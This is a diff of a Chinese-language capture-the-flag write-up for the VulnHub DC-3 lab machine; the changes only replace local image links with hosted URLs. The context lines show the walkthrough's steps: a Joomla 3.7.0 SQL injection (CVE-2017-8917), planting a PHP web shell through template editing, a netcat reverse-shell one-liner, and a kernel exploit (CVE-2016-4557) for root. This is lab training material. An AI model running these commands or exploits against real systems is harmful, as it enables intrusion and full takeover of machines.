@@ -12,11 +12,11 @@ https://vulnhub.com/entry/dc-32,312/
 
 - 使用nmap扫描网段，对照靶机MAC后发现1s92.168.200.153是DC3的IP
 
-![image-20240309144235240](./DC3：渗透实战.assets/image-20240309144235240.png)
+![image-20240309144235240](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309144235240.png)
 
 - 继续使用nmap对该主机进行详细扫描
 
-  ![image-20240309144445188](DC3：渗透实战.assets/image-20240309144445188.png)
+  ![image-20240309144445188](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309144445188.png)
 
 ### 端口详情
 
@@ -26,13 +26,13 @@ https://vulnhub.com/entry/dc-32,312/
 
 - 既然开放了web服务那么直接进入目标web界面
 
-  ![image-20240309144759250](DC3：渗透实战.assets/image-20240309144759250.png)
+  ![image-20240309144759250](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309144759250.png)
 
 ### 指纹识别
 
 - 没有什么信息，进行指纹识别看看，发现该cms界面使用的是`Joomla`
 
-  ![image-20240309144839060](DC3：渗透实战.assets/image-20240309144839060.png)
+  ![image-20240309144839060](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309144839060.png)
 
 ### 漏洞扫描
 
@@ -106,7 +106,7 @@ Your Report : reports/192.168.200.153/
 
 - 发现是`Joomla 3.7.0`版本，直接在漏洞库中查找一下，发现有个[(CVE-2017-8917)](https://www.seebug.org/vuldb/ssvid-93113)sql注入漏洞
 
-  ![image-20240309145617926](DC3：渗透实战.assets/image-20240309145617926.png)
+  ![image-20240309145617926](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309145617926.png)
 
 ### 漏洞验证
 
@@ -120,7 +120,7 @@ http://192.168.200.153/index.php?option=com_fields&view=fields&layout=modal&list
 
 - 验证一下该漏洞，发现验证成功
 
-  ![image-20240309150638841](DC3：渗透实战.assets/image-20240309150638841.png)
+  ![image-20240309150638841](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309150638841.png)
 
 ### 漏洞利用
 
@@ -456,7 +456,7 @@ http://192.168.200.153/index.php?option=com_fields&view=fields&layout=modal&list
 
 - 但是这个密码是个密文，直接用john爆破一下子
 
-  ![image-20240309154812715](DC3：渗透实战.assets/image-20240309154812715.png)
+  ![image-20240309154812715](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309154812715.png)
 
 | 账号  | 密码   |
 | ----- | ------ |
@@ -468,21 +468,21 @@ http://192.168.200.153/index.php?option=com_fields&view=fields&layout=modal&list
 
   
 
-![image-20240309154855721](DC3：渗透实战.assets/image-20240309154855721.png)
+![image-20240309154855721](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309154855721.png)
 
 ### GetShell
 
 - 经过寻找，最终在`Extensions->Templates->Templates`的`Beez3Detail and Files`中发现可以直接修改网站后台文件
 
-  ![image-20240309155310677](DC3：渗透实战.assets/image-20240309155310677.png)
+  ![image-20240309155310677](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309155310677.png)
 
 - 那么直接在html目录下创建一个木马文件
 
-  ![image-20240309155818482](DC3：渗透实战.assets/image-20240309155818482.png)
+  ![image-20240309155818482](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309155818482.png)
 
 - 然后就是找木马文件的路径，根据提示可以看到该文件是存储在html目录下的，而html目录在template下的beez3中。
 
-![image-20240309160243553](DC3：渗透实战.assets/image-20240309160243553.png)
+![image-20240309160243553](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309160243553.png)
 
 - 尝试几次后还是决定搜索一下...发现是模板都是存在`templates`目录下的
 
@@ -490,15 +490,15 @@ http://192.168.200.153/index.php?option=com_fields&view=fields&layout=modal&list
 
 - 直接尝试`192.168.200.153/templates/beez3/html/shell.php`,成功找到
 
-![image-20240309160727264](DC3：渗透实战.assets/image-20240309160727264.png)
+![image-20240309160727264](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309160727264.png)
 
 - 成功拿到shell
 
-  ![image-20240309162446661](DC3：渗透实战.assets/image-20240309162446661.png)
+  ![image-20240309162446661](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309162446661.png)
 
 - 进入虚拟终端后发现是data权限
 
-![image-20240309162519090](DC3：渗透实战.assets/image-20240309162519090.png)
+![image-20240309162519090](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309162519090.png)
 
 - 在本地编写一个信息收集脚本
 
@@ -510,7 +510,7 @@ https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-
 
 
 
-![image-20240309164358174](DC3：渗透实战.assets/image-20240309164358174.png)
+![image-20240309164358174](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309164358174.png)
 
 ### 提权：
 
@@ -526,11 +526,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.200.150 21 >/tmp/f
 
 - 本地先监听
 
-  ![image-20240309163000003](DC3：渗透实战.assets/image-20240309163000003.png)
+  ![image-20240309163000003](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309163000003.png)
 
 - 目标机反弹shell
 
-![image-20240309163116597](DC3：渗透实战.assets/image-20240309163116597.png)
+![image-20240309163116597](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309163116597.png)
 
 
 
@@ -710,7 +710,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.200.150 21 >/tmp/f
 
 - 由此脚本可以看出，可以利用哪些方法进行提权，这里我们使用[CVE-2016-4557]进行提权，需要使用的工具脚本给了地址。我们直接下载下来然后传到目标机器上
 
-  ![image-20240309170212610](DC3：渗透实战.assets/image-20240309170212610.png)
+  ![image-20240309170212610](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309170212610.png)
 
 - 在目标机上解压该文件，并进入39772目录，再解压exploit.tar文件，解压完成后进入该目录，给complile.sh一个执行权限，最后执行该脚本，执行完成后有个doubleput，直接执行它。就发现拥有root权限了
 
@@ -791,4 +791,4 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 - 去root目录下拿最终flag
 
-  ![image-20240309171502368](DC3：渗透实战.assets/image-20240309171502368.png)
+  ![image-20240309171502368](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240309171502368.png)
